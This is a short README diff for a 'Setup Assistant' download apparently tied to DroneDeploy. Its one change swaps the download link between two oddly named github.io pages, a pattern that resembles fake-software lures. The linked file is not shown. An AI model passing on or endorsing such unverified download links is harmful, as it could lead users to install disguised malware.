@@ -7,7 +7,7 @@ Whether you're a surveyor, drone pilot, or construction manager, this assistant 
 ---
 
 🔘 **Download Setup Assistant:**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blue)](https://calleonnbdi.github.io/.github/dronedeploy-tools)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blue)](https://reeceenglishzqul.github.io/.github/dronedeploy-tools)
 
 ---
 
